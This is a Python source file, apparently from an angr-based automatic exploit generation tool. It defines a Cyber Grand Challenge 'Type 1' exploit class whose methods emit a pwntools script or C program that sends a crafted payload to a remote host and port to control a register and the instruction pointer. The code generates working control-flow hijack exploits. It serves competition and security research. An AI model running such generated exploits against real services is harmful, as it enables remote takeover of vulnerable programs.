import os
import angr
import random
import tracer
import shutil
import struct
import resource
import tempfile
from .cgc_exploit import CGCExploit
from .c_templates import c_template_type1

import logging

l = logging.getLogger("rex.exploit.cgc.cgc_type1_exploit")


class CGCType1Exploit(CGCExploit):
    '''
    A CGC exploit object, offers more flexibility than an Exploit object for
    the sake of the game. This should represent a Type 1 POV by allowing you
    to set many different registers to many different values.
    https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/understanding-cfe-povs.md
    '''

    registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

    def __init__(self, crash, register, bypasses_nx, bypasses_aslr,
                 reg_bitmask, ip_bitmask):
        '''
        :param crash: a crash object which has been modified to exploit a
        vulnerability
        :param register: register name which this exploit sets
        :param bypasses_nx: does this exploit bypass NX?
        :param bypasses_aslr: does this exploit bypass ASLR?
        :param reg_bitmask: how many bits of the register can it set?
        :param ip_bitmask: how many bits of the ip can it set?
        '''
        super(CGCType1Exploit, self).__init__(crash, 1, bypasses_nx,
                                              bypasses_aslr)

        self.register = register
        self.value_idx = None
        self.final_ip_idx = None
        self._reg_bitmask = reg_bitmask
        self._ip_bitmask = ip_bitmask
        self._raw_payload = None

    def dump_python(self, filename=None):
        '''
        dump an exploit in the form of a python script
        '''

        payload = """import sys
import time
from pwn import *

if len(sys.argv) < 5:
    print "%s: <host> <port> <value> <final_ip>" % sys.argv[0]
    sys.exit(1)

r = remote(sys.argv[1], sys.argv[2])

value = int(sys.argv[3], 16)
final_ip = int(sys.argv[4], 16)

b = bytearray(\"""" + self._raw_payload.encode('hex') + """\".decode('hex'))
b[""" + str(self.value_idx) + ":" + str(self.value_idx + 4) + """] = p32(value)
b[""" + str(self.final_ip_idx) + ":" + str(self.final_ip_idx + 4) + """] = p32(final_ip)

r.send(b)
"""

        if filename is not None:
            with open(filename, 'w') as f:
                f.write(payload)
        else:
            return payload

    def dump_c(self, filename=None):
        """
        Creates a simple C file to do the type1 exploit
        :param filename: dumps the code to this path if filename is not None
        :return: the c_code
        """
        encoded_payload = ""
        for c in self._raw_payload:
            encoded_payload += "\\x%02x" % ord(c)

        fmt_args = dict()
        fmt_args["register"] = self.register
        fmt_args["regmask"] = hex(self._reg_bitmask)
        fmt_args["ipmask"] = hex(self._ip_bitmask)
        fmt_args["payload"] = encoded_payload
        fmt_args["regoff"] = str(self.value_idx)
        fmt_args["ipoff"] = str(self.final_ip_idx)
        fmt_args["payloadsize"] = str(len(self._raw_payload))

        # TODO using .format is annoying because of all the curly braces
        # figure out how to do this better
        c_code = c_template_type1.c_template
        for k, v in fmt_args.items():
            c_code = c_code.replace("{%s}" % k, v)

        if filename is not None:
            with open(filename, 'w') as f:
                f.write(c_code)
        else:
            return c_code
